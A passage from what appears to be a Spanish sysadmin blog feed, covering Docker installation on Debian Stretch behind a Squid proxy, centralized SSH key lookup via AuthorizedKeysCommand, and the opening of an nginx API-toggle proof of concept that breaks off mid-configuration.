&lt;p&gt;En este caso, lo necesito para mi uso personal, pero en el ámbito de mi trabajo. Una de las particularidades a las que me enfrento es un &lt;em&gt;proxy&lt;/em&gt; &lt;strong&gt;squid&lt;/strong&gt; no transparente, así que también voy a ponerlo como anotaciones en el artículo.&lt;/p&gt;
&lt;h2&gt;El servidor base&lt;/h2&gt;
&lt;p&gt;Se trata de instalar un sistema operativo básico con SSH, partiendo de la imagen &lt;em&gt;netinst&lt;/em&gt;, que considero suficiente para un servidor estándar, y me evita descargar una &lt;em&gt;iso&lt;/em&gt; más grande.&lt;/p&gt;
&lt;p&gt;No voy a explicar como se instala; simplemente he respondido las preguntas de la instalación tal como me las hacía. Solo hace falta tener en cuenta que se eligió el servidor &lt;strong&gt;SSH&lt;/strong&gt; durante la instalación (concretamente en el &lt;em&gt;tasksel&lt;/em&gt;) y que se indicó el &lt;em&gt;proxy&lt;/em&gt; cuando se me preguntó.&lt;/p&gt;
&lt;p&gt;Para evitar que la operación &lt;strong&gt;apt-get update&lt;/strong&gt; tarde más tiempo de lo debido, vamos a limpiar el fichero &lt;em&gt;/etc/apt/sources.list&lt;/em&gt;, eliminando las entradas que no nos interesen.&lt;/p&gt;
&lt;p&gt;Y ya para acabar, vamos a crear una carpeta &lt;em&gt;bin&lt;/em&gt; para nuestro usuario de trabajo, lo que hace especialmente fácil poner &lt;em&gt;scripts&lt;/em&gt; locales para el mismo usuario.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ mkdir bin
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Instalar docker engine y docker-compose&lt;/h2&gt;
&lt;h3&gt;Docker engine&lt;/h3&gt;
&lt;p&gt;Para instalar &lt;strong&gt;docker engine&lt;/strong&gt; vamos a seguir &lt;a href="https://docs.docker.com/engine/installation/linux/docker-ce/debian/"&gt;la documentación&lt;/a&gt;. El primer paso es descargarse la clave oficial GPG de &lt;strong&gt;docker&lt;/strong&gt;, para que &lt;strong&gt;apt&lt;/strong&gt; confíe en la fuente de &lt;em&gt;software&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: es probable que el comando &lt;strong&gt;wget&lt;/strong&gt; falle si estamos detrás de un &lt;em&gt;proxy&lt;/em&gt;; basta con exportar la variable de entorno &lt;strong&gt;https_proxy&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@atlantis:~# apt-get install apt-transport-https
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
...
root@atlantis:~# wget -qO- https://download.docker.com/linux/debian/gpg &lt;span class="p"&gt;|&lt;/span&gt; apt-key add -
OK
root@atlantis:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Añadimos la línea adecuada para usar el repositorio oficial de &lt;strong&gt;docker&lt;/strong&gt; y, tras hacer el correspondiente &lt;em&gt;update&lt;/em&gt;, instalamos el paquete &lt;strong&gt;docker-ce&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@atlantis:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;deb https://download.docker.com/linux/debian stretch stable&amp;quot;&lt;/span&gt; &amp;gt; /etc/apt/sources.list.d/docker.list
root@atlantis:~# apt-get update
Obj:1 http://security.debian.org/debian-security stretch/updates InRelease
Des:2 https://download.docker.com/linux/debian stretch InRelease &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;20&lt;/span&gt;,2 kB&lt;span class="o"&gt;]&lt;/span&gt;
Des:3 https://download.docker.com/linux/debian stretch/stable amd64 Packages &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.934 B&lt;span class="o"&gt;]&lt;/span&gt;
Ign:4 http://ftp.fr.debian.org/debian stretch InRelease
Des:5 http://ftp.fr.debian.org/debian stretch-updates InRelease &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;88&lt;/span&gt;,5 kB&lt;span class="o"&gt;]&lt;/span&gt;
Obj:6 http://ftp.fr.debian.org/debian stretch Release
Descargados &lt;span class="m"&gt;111&lt;/span&gt; kB en 5s &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;19&lt;/span&gt;,5 kB/s&lt;span class="o"&gt;)&lt;/span&gt;
Leyendo lista de paquetes... Hecho
root@atlantis:~# apt-get install docker-ce
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
...
root@atlantis:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para hacer mas fácil el acceso a &lt;strong&gt;docker&lt;/strong&gt; para el usuario de trabajo, vamos a añadirlo al mismo grupo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@atlantis:~# usermod -a -G docker gerard
root@atlantis:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Docker compose&lt;/h3&gt;
&lt;p&gt;Para instalar esta utilidad, vamos a seguir &lt;a href="https://docs.docker.com/compose/install/"&gt;su documentación&lt;/a&gt;. En esencia se limita a descargar el binario en algún lugar del &lt;em&gt;path&lt;/em&gt; y a darle permisos de ejecución.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@atlantis:~# wget -qO /usr/local/bin/docker-compose https://github.com/docker/compose/releases/download/1.14.0/docker-compose-&lt;span class="sb"&gt;`&lt;/span&gt;uname -s&lt;span class="sb"&gt;`&lt;/span&gt;-&lt;span class="sb"&gt;`&lt;/span&gt;uname -m&lt;span class="sb"&gt;`&lt;/span&gt;
root@atlantis:~# chmod &lt;span class="m"&gt;755&lt;/span&gt; /usr/local/bin/docker-compose
root@atlantis:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Sobre los servidores proxy&lt;/h2&gt;
&lt;p&gt;Trabajar detrás de un servidor &lt;em&gt;proxy&lt;/em&gt; es un problema cuando trabajamos con &lt;strong&gt;docker&lt;/strong&gt;, ya que el &lt;em&gt;proxy&lt;/em&gt; debe configurarse a nivel de servicio, luego debe especificarse en cada &lt;em&gt;docker build&lt;/em&gt; y finalmente en cada &lt;em&gt;docker run&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La primera configuración &lt;em&gt;proxy&lt;/em&gt; necesaria es la de &lt;strong&gt;apt&lt;/strong&gt;. Por suerte para nosotros, cuando instalamos el sistema operativo y lo indicamos ya nos guardó ese parámetro en &lt;em&gt;/etc/apt/apt.conf&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ cat /etc/apt/apt.conf
Acquire::http::Proxy &lt;span class="s2"&gt;&amp;quot;http://192.168.0.2:3128&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A veces, algunos comandos como el &lt;strong&gt;wget&lt;/strong&gt; necesitan definir el &lt;em&gt;proxy&lt;/em&gt; como una variable de sistema; por ejemplo, para poner la variable &lt;strong&gt;https_proxy&lt;/strong&gt; para esta sesión de terminal, podemos hacer algo como:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@atlantis:~# &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;https_proxy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;http://192.168.0.2:3128
root@atlantis:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El demonio de &lt;strong&gt;docker&lt;/strong&gt; utiliza el &lt;em&gt;proxy&lt;/em&gt; definido en las variables de sistema. En el caso de &lt;em&gt;systemd&lt;/em&gt; podemos añadir estas variables de forma fácil añadiendo una configuración &lt;em&gt;overlay&lt;/em&gt;. Esto hace necesario recargar las configuraciones para el demonio de &lt;strong&gt;systemd&lt;/strong&gt; y luego el mismo demonio de &lt;strong&gt;docker&lt;/strong&gt; para que utilice las nuevas variables.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@atlantis:~# mkdir /etc/systemd/system/docker.service.d
root@atlantis:~# cat /etc/systemd/system/docker.service.d/proxy.conf
&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;Environment&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HTTP_PROXY=http://192.168.0.2:3128&amp;quot;&lt;/span&gt;
&lt;span class="nv"&gt;Environment&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HTTPS_PROXY=http://192.168.0.2:3128&amp;quot;&lt;/span&gt;
root@atlantis:~# systemctl daemon-reload
root@atlantis:~# systemctl restart docker
root@atlantis:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente, y por comodidad podemos añadir estas variables de entorno de forma permanente para el usuario de trabajo en el fichero &lt;em&gt;~/.bashrc&lt;/em&gt;, de forma que en cada nueva sesión de SSH no tengamos que redefinirlas. Aprovechamos también para añadir algunos &lt;em&gt;alias&lt;/em&gt; útiles para reducir los comandos de construcción de imágenes y ejecución de contenedores, escondiendo las variables del &lt;em&gt;proxy&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ cat .bashrc
...
&lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="nv"&gt;drun&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;docker run -e &amp;quot;http_proxy=http://192.168.0.2:3128&amp;quot; -e &amp;quot;https_proxy=http://192.168.0.2:3128&amp;quot;&amp;#39;&lt;/span&gt;
&lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="nv"&gt;dbuild&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;docker build --build-arg=&amp;quot;http_proxy=http://192.168.0.2:3128&amp;quot; --build-arg=&amp;quot;https_proxy=http://192.168.0.2:3128&amp;quot;&amp;#39;&lt;/span&gt;
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;HTTP_PROXY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;http://192.168.0.2:3128
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;HTTPS_PROXY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;HTTP_PROXY&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;http_proxy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;HTTP_PROXY&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;https_proxy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;HTTP_PROXY&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;NO_PROXY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;127.0.0.1,localhost&amp;quot;&lt;/span&gt;
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;no_proxy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NO_PROXY&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Siguientes pasos&lt;/h2&gt;
&lt;p&gt;Es probable que este servidor necesite algunas utilidades que no hayan venido con los paquetes base. Nada nos impide ponerlos nosotros a mano, con los correspondientes &lt;em&gt;apt-get install&lt;/em&gt;. A partir de aquí, solo nos queda disfrutar de nuestro nuevo servidor &lt;strong&gt;docker&lt;/strong&gt; mínimo.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="stretch"></category><category term="docker"></category><category term="docker-compose"></category></entry><entry><title>Autenticación centralizada por claves SSH</title><link href="http://www.linuxsysadmin.ml/2017/07/autenticacion-centralizada-por-claves-ssh.html" rel="alternate"></link><published>2017-07-17T10:00:00+02:00</published><updated>2017-07-17T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-07-17:/2017/07/autenticacion-centralizada-por-claves-ssh.html</id><summary type="html">&lt;p&gt;Ya vimos en &lt;a href="http://www.linuxsysadmin.ml/2016/05/autenticacion-ssh-por-claves.html"&gt;un artículo anterior&lt;/a&gt; como autenticar las sesiones &lt;strong&gt;SSH&lt;/strong&gt; mediante claves locales en la máquina. Sin embargo, esto no es práctico cuando tenemos muchos servidores, y hay que replicar esas claves en todos ellos. Hoy vamos a ver como usar un &lt;em&gt;script&lt;/em&gt; que pueda sacar las claves dinámicamente …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ya vimos en &lt;a href="http://www.linuxsysadmin.ml/2016/05/autenticacion-ssh-por-claves.html"&gt;un artículo anterior&lt;/a&gt; como autenticar las sesiones &lt;strong&gt;SSH&lt;/strong&gt; mediante claves locales en la máquina. Sin embargo, esto no es práctico cuando tenemos muchos servidores, y hay que replicar esas claves en todos ellos. Hoy vamos a ver como usar un &lt;em&gt;script&lt;/em&gt; que pueda sacar las claves dinámicamente.&lt;/p&gt;
&lt;p&gt;Empezamos teniendo un servidor con el servicio &lt;strong&gt;SSH&lt;/strong&gt; levantado; vamos a crear un usuario &lt;em&gt;guest&lt;/em&gt; en él para que pueda abrir una sesión en él.&lt;/p&gt;
&lt;h2&gt;Estado inicial&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@sshserver:~# adduser guest
Adding user &lt;span class="sb"&gt;`&lt;/span&gt;guest&lt;span class="s1"&gt;&amp;#39; ...&lt;/span&gt;
&lt;span class="s1"&gt;Adding new group `guest&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; ...
Adding new user &lt;span class="sb"&gt;`&lt;/span&gt;guest&lt;span class="s1"&gt;&amp;#39; (1000) with group `guest&amp;#39;&lt;/span&gt; ...
Creating home directory &lt;span class="sb"&gt;`&lt;/span&gt;/home/guest&lt;span class="s1"&gt;&amp;#39; ...&lt;/span&gt;
&lt;span class="s1"&gt;Copying files from `/etc/skel&amp;#39;&lt;/span&gt; ...
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
Changing the user information &lt;span class="k"&gt;for&lt;/span&gt; guest
Enter the new value, or press ENTER &lt;span class="k"&gt;for&lt;/span&gt; the default
    Full Name &lt;span class="o"&gt;[]&lt;/span&gt;: 
    Room Number &lt;span class="o"&gt;[]&lt;/span&gt;: 
    Work Phone &lt;span class="o"&gt;[]&lt;/span&gt;: 
    Home Phone &lt;span class="o"&gt;[]&lt;/span&gt;: 
    Other &lt;span class="o"&gt;[]&lt;/span&gt;: 
Is the information correct? &lt;span class="o"&gt;[&lt;/span&gt;Y/n&lt;span class="o"&gt;]&lt;/span&gt; y
root@sshserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por supuesto, este usuario pueden entrar con su contraseña sin problemas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/ssh$ ssh guest@sshserver
guest@sshserver&amp;#39;s password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
guest@sshserver:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;El script&lt;/h2&gt;
&lt;p&gt;La idea es que necesitamos un &lt;em&gt;script&lt;/em&gt; que reciba como primer parámetro el usuario del que queremos las claves, y este &lt;em&gt;script&lt;/em&gt; nos va a dar una salida con el mismo formato que pondríamos en el &lt;em&gt;authorized_keys&lt;/em&gt;. Eso significa que podemos devolver 0, 1 o mas líneas, con una clave pública por línea.&lt;/p&gt;
&lt;p&gt;No es importante de donde saque este &lt;em&gt;script&lt;/em&gt; la información; puede ser de un campo LDAP, de una base de datos, o de una llamada a un &lt;em&gt;webservice&lt;/em&gt;. Para evitar complicaciones innecesarias, para este artículo y a modo de ejemplo, vamos a poner los valores en el mismo &lt;em&gt;script&lt;/em&gt;. Echad un poco de imaginación si lo reproducís.&lt;/p&gt;
&lt;p&gt;Supongamos que queremos entrar con el usuario &lt;em&gt;guest&lt;/em&gt;, y disponemos en la máquina inicial la clave privada &lt;em&gt;id_rsa&lt;/em&gt;, habiendo generado una clave pública correspondiente. Creamos un &lt;em&gt;script&lt;/em&gt; que nos vuelque esta clave si el usuario solicitado es &lt;em&gt;guest&lt;/em&gt;, siempre con permisos de ejecución.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@sshserver:~# cat /usr/bin/authorized_keys_by_user.sh 
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;guest&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9heqwqgv+O9aekeCpETDR/6BdTQWDOrSlNN/tnZeZZa8/qjf0JEF4r8jSA/MquPQog1tpOXM0XUEY9YWNphARAmZ/gV1IiNJZmqQJSb2pk2/nQLq9nCqWoHBgKHKINUKfgmsiopGz9IjnZw5BBZKrloE9ZU0oApduxnVUTl/G71OWH/SdCbef08zvwVvLxv3zAWEKSnRvnSn5Q/FkRNb4Qe09po8ePgMqpZWKUvEpAntOvokI7uid300mmZjiUL8EMbJo4oJ3ONOnDbH8FNKEmGI4q2UK5HbDIUm8SJcmyJXvoo6xabApkc2AcM7X2tXRd8wiYS0p7YjLVMcIJ/NR gerard@sirius&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;fi&lt;/span&gt;
root@sshserver:~# chmod &lt;span class="m"&gt;755&lt;/span&gt; /usr/bin/authorized_keys_by_user.sh 
root@sshserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos comprobar que nos da la clave pública para el usuario &lt;em&gt;guest&lt;/em&gt; y ninguna para otros usuarios.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@sshserver:~# /usr/bin/authorized_keys_by_user.sh guest
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9heqwqgv+O9aekeCpETDR/6BdTQWDOrSlNN/tnZeZZa8/qjf0JEF4r8jSA/MquPQog1tpOXM0XUEY9YWNphARAmZ/gV1IiNJZmqQJSb2pk2/nQLq9nCqWoHBgKHKINUKfgmsiopGz9IjnZw5BBZKrloE9ZU0oApduxnVUTl/G71OWH/SdCbef08zvwVvLxv3zAWEKSnRvnSn5Q/FkRNb4Qe09po8ePgMqpZWKUvEpAntOvokI7uid300mmZjiUL8EMbJo4oJ3ONOnDbH8FNKEmGI4q2UK5HbDIUm8SJcmyJXvoo6xabApkc2AcM7X2tXRd8wiYS0p7YjLVMcIJ/NR gerard@sirius
root@sshserver:~# /usr/bin/authorized_keys_by_user.sh other
root@sshserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso hemos puesto una sola clave, pero podrían haber sido varias, igual que cuando usamos el fichero &lt;em&gt;authorized_keys&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Configuración SSH&lt;/h2&gt;
&lt;p&gt;Por una limitación del servicio &lt;strong&gt;SSH&lt;/strong&gt;, es necesario que tanto el &lt;em&gt;script&lt;/em&gt; como todas las carpetas en el &lt;em&gt;path&lt;/em&gt;, pertenezcan al usuario &lt;em&gt;root&lt;/em&gt; y que solo este tenga permisos de escritura. Aunque nos saldría un mensaje de error en el &lt;em&gt;log&lt;/em&gt; del &lt;strong&gt;SSH&lt;/strong&gt;, cuesta poco de comprobarlo antes.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@sshserver:~# &lt;span class="k"&gt;for&lt;/span&gt; folder in / /usr /usr/bin /usr/bin/authorized_keys_by_user.sh&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; stat --printf &lt;span class="s2"&gt;&amp;quot;%U:%G\t%A %n\n&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;$folder&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
root:root   drwxr-xr-x /
root:root   drwxr-xr-x /usr
root:root   drwxr-xr-x /usr/bin
root:root   -rwxr-xr-x /usr/bin/authorized_keys_by_user.sh
root@sshserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El truco consiste en indicar dos directivas al demonio &lt;strong&gt;SSH&lt;/strong&gt;, para que sepa que debe ejecutar este &lt;em&gt;script&lt;/em&gt; para sacar el &lt;em&gt;authorized_keys&lt;/em&gt; de cada usuario.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@sshserver:~# tail -2 /etc/ssh/sshd_config 
AuthorizedKeysCommand /usr/bin/authorized_keys_by_user.sh
AuthorizedKeysCommandUser nobody
root@sshserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Recargamos la configuración del demonio &lt;strong&gt;SSH&lt;/strong&gt;, para que relea la configuración nueva que acabamos de poner.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@sshserver:~# service ssh reload
Reloading OpenBSD Secure Shell server&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s configuration: sshd.
root@sshserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solo nos queda comprobar que podemos entrar con el usuario &lt;em&gt;guest&lt;/em&gt; usando la clave privada. En este ejemplo no se indica porque la clave &lt;em&gt;.ssh/id_rsa&lt;/em&gt; es ofrecida por defecto, y es la parte privada de la clave que pusimos en el &lt;em&gt;script&lt;/em&gt; remoto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/ssh$ ssh guest@sshserver

The programs included with the Debian GNU/Linux system are free software&lt;span class="p"&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class="k"&gt;for&lt;/span&gt; each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul &lt;span class="m"&gt;21&lt;/span&gt; &lt;span class="m"&gt;08&lt;/span&gt;:39:21 &lt;span class="m"&gt;2016&lt;/span&gt; from &lt;span class="m"&gt;172&lt;/span&gt;.20.0.1
guest@sshserver:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de aquí, podéis modificar el &lt;em&gt;script&lt;/em&gt; remoto para que saque la información de las claves de algún sitio centralizado (LDAP, base de datos, &lt;em&gt;webservice&lt;/em&gt;, ...).&lt;/p&gt;</content><category term="ssh"></category><category term="autenticación"></category><category term="password"></category><category term="passphrase"></category><category term="centralizado"></category></entry><entry><title>Desactivando nuestras APIs con un frontal nginx</title><link href="http://www.linuxsysadmin.ml/2017/07/desactivando-nuestras-apis-con-un-frontal-nginx.html" rel="alternate"></link><published>2017-07-10T10:00:00+02:00</published><updated>2017-07-10T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-07-10:/2017/07/desactivando-nuestras-apis-con-un-frontal-nginx.html</id><summary type="html">&lt;p&gt;El otro día recibí una petición algo atípica en mi trabajo: querían activar y desactivar en un único punto centralizado cada una de las varias APIs que tenemos. Se trata de poner un &lt;strong&gt;nginx&lt;/strong&gt; frontal que gestione los &lt;em&gt;virtualhosts&lt;/em&gt; existentes y haga &lt;em&gt;proxy_pass&lt;/em&gt; o no en función de un &lt;em&gt;flag …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;El otro día recibí una petición algo atípica en mi trabajo: querían activar y desactivar en un único punto centralizado cada una de las varias APIs que tenemos. Se trata de poner un &lt;strong&gt;nginx&lt;/strong&gt; frontal que gestione los &lt;em&gt;virtualhosts&lt;/em&gt; existentes y haga &lt;em&gt;proxy_pass&lt;/em&gt; o no en función de un &lt;em&gt;flag&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La propuesta me pareció bastante interesante, así que decidí hacer una prueba de concepto que aquí queda reflejada. Se trata de ofrecer un frontal web (por ejemplo un &lt;strong&gt;jenkins&lt;/strong&gt;) mediante el cual se puedan poner los ficheros cuya presencia le indican a &lt;strong&gt;nginx&lt;/strong&gt; si ese &lt;em&gt;virtualhost&lt;/em&gt; concreto debe dar un error o no.&lt;/p&gt;
&lt;h2&gt;Simulando las APIs&lt;/h2&gt;
&lt;p&gt;Vamos a poner un par de contenedores &lt;strong&gt;docker&lt;/strong&gt; con &lt;strong&gt;nginx&lt;/strong&gt;, que sirvan una página personalizada y nos sirva para simular la API. No es especialmente complejo, así que solo se adjunta por completitud.&lt;/p&gt;
&lt;p&gt;el único punto interesante es que, para no repetirnos, vamos a pasar el contenido del fichero &lt;em&gt;index.html&lt;/em&gt; como una variable de entorno. Así no hay que construir varias imágenes.&lt;/p&gt;
&lt;p&gt;Empezamos con un &lt;em&gt;Dockerfile&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gw-poc$ cat api/Dockerfile 
FROM alpine:3.5
RUN apk add --no-cache nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stdout /var/log/nginx/access.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stderr /var/log/nginx/error.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /run/nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /srv/www &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /etc/nginx/conf.d/default.conf
COPY nginx.conf /etc/nginx/
COPY conf.d/* /etc/nginx/conf.d/
COPY start.sh /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/start.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/gw-poc$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y lo acompañamos con sus ficheros auxiliares.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gw-poc$ cat api/nginx.conf 
worker_processes  &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
events &lt;span class="o"&gt;{&lt;/span&gt;
    worker_connections  &lt;span class="m"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
http &lt;span class="o"&gt;{&lt;/span&gt;
    include mime.types&lt;span class="p"&gt;;&lt;/span&gt;
    default_type application/octet-stream&lt;span class="p"&gt;;&lt;/span&gt;
    sendfile on&lt;span class="p"&gt;;&lt;/span&gt;
    keepalive_timeout &lt;span class="m"&gt;65&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    include conf.d/*&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~/docker/gw-poc$ cat api/conf.d/api 
server &lt;span class="o"&gt;{&lt;/span&gt;
    server_name _&lt;span class="p"&gt;;&lt;/span&gt;
